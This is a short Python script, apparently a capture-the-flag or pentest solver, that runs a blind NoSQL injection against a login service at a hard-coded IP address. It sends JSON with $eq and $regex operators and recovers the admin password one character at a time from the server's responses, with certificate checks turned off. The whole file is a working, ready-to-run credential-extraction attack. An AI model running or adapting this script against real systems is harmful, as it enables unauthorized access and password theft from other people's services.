import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password="d2f312ed7ed60ea79e3ab3d16ab2f8db$$$$$$"
u="http://34.93.215.188:3000/"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            print(r.text)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c